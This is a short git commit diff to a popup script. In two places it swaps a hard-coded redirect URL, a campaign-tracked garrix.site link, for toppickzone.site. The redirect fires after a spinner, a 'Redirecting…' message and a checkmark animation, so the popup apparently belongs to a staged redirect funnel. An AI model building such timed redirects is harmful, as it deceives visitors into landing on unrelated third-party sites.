951022fd45b03af80e7410e98295e302f8df1151
super-usa <srbhsuper@gmail.com>
2026-05-26 13:41:30 +0530

    Update popup.js

--- assets/js/popup.js
+++ assets/js/popup.js
@@ -145,7 +145,7 @@
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'http://garrix.site/?utm_campaign=t5ZnP4acZI&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
+        setTimeout(() => { window.location.href = 'https://toppickzone.site/'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
@@ -299,7 +299,7 @@
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'http://garrix.site/?utm_campaign=t5ZnP4acZI&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
+        setTimeout(() => { window.location.href = 'https://toppickzone.site/'; }, 600);
       }, 5000);
     }, 300); // "few milliseconds" before starting the spinner
   }
